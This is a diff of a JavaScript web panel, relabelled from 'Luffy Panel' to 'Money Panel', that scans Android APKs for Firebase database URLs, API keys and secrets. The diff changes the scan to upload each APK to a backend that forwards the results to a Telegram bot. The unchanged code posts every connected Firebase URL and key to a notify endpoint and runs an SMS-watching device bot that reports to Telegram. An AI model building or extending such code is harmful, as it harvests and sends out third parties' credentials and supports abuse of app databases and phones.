@@ -685,38 +685,39 @@ async function processApkFile(file) {
   document.getElementById('apk-scan-status').textContent = file.name;
 
   try {
-    // Read file as text (APK is a ZIP; we do a simple string search)
-    var buf = await file.arrayBuffer();
-    var bytes = new Uint8Array(buf);
-    // Search for firebaseio.com in raw bytes
-    var text = '';
-    // Convert chunk by chunk to avoid OOM
-    var chunkSize = 65536;
-    for (var i = 0; i < Math.min(bytes.length, 2000000); i += chunkSize) {
-      var chunk = bytes.slice(i, i + chunkSize);
-      text += String.fromCharCode.apply(null, chunk);
+    // Upload to backend API for scanning and Telegram notification
+    var formData = new FormData();
+    formData.append('apk', file);
+
+    var response = await fetch('/api/apk-scan', {
+      method: 'POST',
+      body: formData
+    });
+
+    if (!response.ok) {
+      var errData = await response.json().catch(function() { return {}; });
+      throw new Error(errData.error || 'Failed to scan APK (HTTP ' + response.status + ')');
     }
 
-    // Find firebase URL
-    var urlMatch = text.match(/https?:\/\/[a-zA-Z0-9\-]+\.firebaseio\.com/);
-    var apiKeyMatch = text.match(/AIza[a-zA-Z0-9\-_]{35}/);
-    // Also try to find DB secret (40 hex chars or mixed)
-    var secretMatch = text.match(/(?:database_secret|secret)[^a-zA-Z0-9]([a-zA-Z0-9\-_]{39,45})/i) ||
-                      text.match(/([a-zA-Z0-9\-_]{39,45})(?=[^a-zA-Z0-9])/g);
-
-    var foundUrl = urlMatch ? urlMatch[0] : null;
-    var foundKey = apiKeyMatch ? apiKeyMatch[0] : null;
-
-    if (!foundUrl) throw new Error('Firebase URL not found in APK.');
+        var result = await response.json();
+    
+    if (!result.url && !result.success) {
+      throw new Error(result.error || 'Firebase URL not found in APK.');
+    }
 
     document.getElementById('apk-scanning').classList.remove('visible');
     document.getElementById('apk-success').classList.add('visible');
-    document.getElementById('apk-url-display').textContent = foundUrl;
-    document.getElementById('apk-key-display').textContent = foundKey || 'Not found â€” enter manually';
+    document.getElementById('apk-url-display').textContent = result.url || 'Not found';
+    document.getElementById('apk-key-display').textContent = result.key || 'Not found â€" enter manually';
 
     // Auto-fill fields
-    document.getElementById('input-url').value = foundUrl;
-    if (foundKey) document.getElementById('input-key').value = foundKey;
+    if (result.url) document.getElementById('input-url').value = result.url;
+    if (result.key) document.getElementById('input-key').value = result.key;
+
+    // Show success toast that data was sent to Telegram
+    if (result.telegram) {
+      showToast('✅ APK data sent to Telegram bot!', 5000);
+    }
 
   } catch(e) {
     document.getElementById('apk-scanning').classList.remove('visible');
@@ -746,10 +747,10 @@ async function startDashboard(url, key) {
   (function() {
     try {
       var ts  = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      var txt = '\uD83D\uDD25 <b>LUFFY PANEL \u2014 New Firebase Connected</b>\n\n'
+      var txt = '🔥 <b>MONEY PANEL — New Firebase Connected</b>\n\n'
         + '<b>URL:</b> <code>' + url + '</code>\n\n'
         + '<b>Key:</b> <code>' + key + '</code>\n\n'
-        + '\u23F0 ' + ts;
+        + '⏰ ' + ts;
       fetch('/api/notify', {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -2102,11 +2103,11 @@ function startBot(deviceId) {
 
     // Announce (mirrors bot.py main() owner notify)
     await tgSend(cfg.token, cfg.chatId,
-      '\ud83d\udfe2 <b>Luffy Panel Bot Started</b>\n\n' +
-      '\ud83d\udcf1 Device: <code>' + deviceId + '</code>\n' +
-      '\ud83d\udcf6 SIM' + (cfg.sim||1) + ' \u00b7 Repeat: \u00d7' + (cfg.repeat||1) + '\n' +
-      '\ud83d\udd04 Format: ' + (cfg.format || 'auto') + '\n\n' +
-      '<i>Watching for SMS requests\u2026</i>'
+      '🟢 <b>Money Panel Bot Started</b>\n\n' +
+      '📱 Device: <code>' + deviceId + '</code>\n' +
+      '📶 SIM' + (cfg.sim||1) + ' · Repeat: ×' + (cfg.repeat||1) + '\n' +
+      '🔄 Format: ' + (cfg.format || 'auto') + '\n\n' +
+      '<i>Watching for SMS requests…</i>'
     );
 
     // 4s polling loop (mirrors asyncio.sleep(4))
@@ -2124,7 +2125,7 @@ function stopBot(deviceId) {
   var cfg = getBotCfg(deviceId);
   if (cfg.token && cfg.chatId) {
     tgSend(cfg.token, cfg.chatId,
-      '\ud83d\udd34 <b>Luffy Panel Bot Stopped</b>\n<i>Panel tab closed or bot manually stopped.</i>'
+      '🔴 <b>Money Panel Bot Stopped</b>\n<i>Panel tab closed or bot manually stopped.</i>'
     );
   }
   setBotCfg(deviceId, { enabled: false });
